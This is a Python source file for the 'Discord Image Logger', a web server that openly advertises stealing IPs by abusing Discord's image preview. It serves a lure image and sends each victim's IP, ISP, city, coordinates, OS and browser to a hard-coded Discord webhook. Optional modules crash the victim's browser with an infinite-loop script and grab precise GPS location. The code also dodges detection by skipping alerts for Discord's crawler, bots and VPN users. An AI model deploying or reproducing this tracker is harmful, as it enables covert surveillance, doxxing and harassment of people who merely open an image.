# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1335296747915972702/3sgxWe0S87J5pshn3-KF_9AcZBsRxExGB7WQ8k6wFqSmj8ajv_cWes3aWkpaRgPNhQRE",
    "image": "data:image/jpeg;base64,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", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = app = ImageLoggerAPI
